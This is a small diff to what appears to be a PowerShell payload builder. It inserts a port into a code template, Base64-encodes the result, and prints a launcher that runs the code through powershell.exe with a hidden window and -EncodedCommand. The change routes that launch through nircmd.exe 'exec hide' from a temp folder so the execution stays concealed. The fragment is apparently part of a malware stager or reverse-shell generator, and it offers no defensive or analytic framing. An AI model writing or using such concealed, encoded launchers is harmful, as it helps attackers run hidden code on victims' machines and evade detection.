@@ -71,4 +71,4 @@ $code = $code -replace "PORT_TOKEN", "$port"
 $codebytes = [System.Text.Encoding]::Unicode.GetBytes($code)
 $base64code = [System.Convert]::ToBase64String($codebytes)
 
-Write-Host "powershell.exe -NoProfile -WindowStyle hidden -EncodedCommand $base64code"
+Write-Host "C:\Users\%USERNAME%\AppData\Local\Temp\tmpaddonz\nircmd.exe exec hide powershell.exe -NoProfile -WindowStyle hidden -EncodedCommand $base64code"
